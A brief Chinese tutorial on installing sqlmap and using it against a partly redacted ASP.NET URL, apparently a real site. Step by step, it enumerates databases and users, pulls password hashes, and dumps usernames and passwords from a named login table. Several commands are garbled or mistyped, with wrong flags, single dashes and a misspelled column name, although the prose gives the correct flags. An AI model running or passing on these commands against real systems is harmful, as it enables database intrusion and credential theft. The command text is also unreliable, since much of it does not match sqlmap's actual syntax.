# SQL MAP安裝與使用

## 介紹 <a id="jie-shao"></a>

SQLMAP是一款非常強大的開源滲透測試工具，用於自動檢測和利用SQL注入漏洞控制數據庫服務器的過程。它配備了一個強大的檢測引擎，由Python語言開發完成，通過外部連接訪問數據庫底層文件系統和操作系統，並執行命令實現滲透。

## 安裝方法： <a id="an-zhuang-fang-fa"></a>

cmd

`pip install sqlmap`

##  漏洞檢測 <a id="lou-dong-jian-ce"></a>

 cd去到Python環境sqlmap文件夾下，運行命令：

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"`**

 1.獲取所有數據庫

 參數：--dbs

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"--dbs`**

 2.獲取當前數據庫

 參數：--current-db

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"--current lab`**

 3.獲取數據庫所有用戶

 參數：--users

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"--users`**

4.獲取數據庫當前用戶

參數：--current-user

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"--current-users`**

 5.獲取數據庫所有用戶和密碼

 參數：--passwords

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"--passwords`**

 **6.** 獲取數據庫所有表 參數：-D ahykd\_new --tables

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"-D ahykd_new-tables`**

 **7.** 獲取數據庫登錄表所有內容 參數：-D ahykd\_new -T usr --columns

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"-D ahykd_new -T usr-columns`**

 **8.** 獲取數據庫登錄表用戶名和密碼 參數：-D ahykd\_new -T usr -C "usr\_name,password" --dump

**`python sqlmap -py -u “http://.../tztgxx.aspx?code = 155"-D ahykd_new -T usr-C" usr_naem,password"-dump`**

